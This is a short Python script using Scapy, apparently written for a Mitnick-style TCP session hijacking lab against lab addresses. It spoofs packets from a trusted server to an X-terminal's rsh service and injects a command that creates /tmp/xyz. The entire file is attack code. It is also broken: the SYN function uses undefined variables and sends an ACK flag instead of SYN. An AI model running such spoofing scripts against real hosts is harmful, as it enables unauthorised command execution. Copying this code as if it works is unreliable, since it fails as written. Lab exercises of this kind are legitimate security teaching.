#!/usr/bin/python3

from scapy.all import *
import sys
import time

X_terminal_IP = "10.9.0.5"          #ip's of the X-terminal and the trusted server
X_terminal_port = 514

Trusted_server_IP = "10.9.0.6"
Trusted_server_port = 1023

def spoof_pkt(pkt):
    sequence = 778933536 + 1
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]

    tcp_len = old_ip.len - old_ip.ihl * 4 - old_tcp.dataofs * 4
    print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))

    if old_tcp.flags == "SA":           #if packet is SYN-ACK
        print("Sending spoofed ACK packet...")      #send spoofed ACK packet in response to SYN-ACK
        IPLayer = IP(src=Trusted_server_IP, dst=X_terminal_IP)
        TCPlayer = TCP(sport=Trusted_server_port, dport=X_terminal_port, flags="A", seq=sequence, ack=old_tcp.seq + 1)
        pkt = IPLayer / TCPlayer
        send(pkt, verbose=0)

        print("Sending spoofed RSH Data packet...")     # RSH Data packet
        data = "9090\x00seed\x00seed\x00touch /tmp/xyz\x00" # RSH command, create a file /tmp/xyz
        pkt = IPLayer / TCPlayer / data
        send(pkt, verbose=0) 

def spoofing_SYN():
    print("Sending spoofed SYN packet...")
    IPLayer = IP(src=Trusted_server_IP, dst=X_terminal_IP)
    TCPlayer = TCP(sport=Trusted_server_port, dport=X_terminal_port, flags="A", seq=sequence, ack=old_ip.seq+1)
    pkt = IPLayer / TCPlayer
    send(pkt, verbose=0)


def main():
    spoofing_SYN()
    time.sleep(10)
    pkt = sniff(filter="tcp and host 10.9.0.5", prn=spoof_pkt)

main()
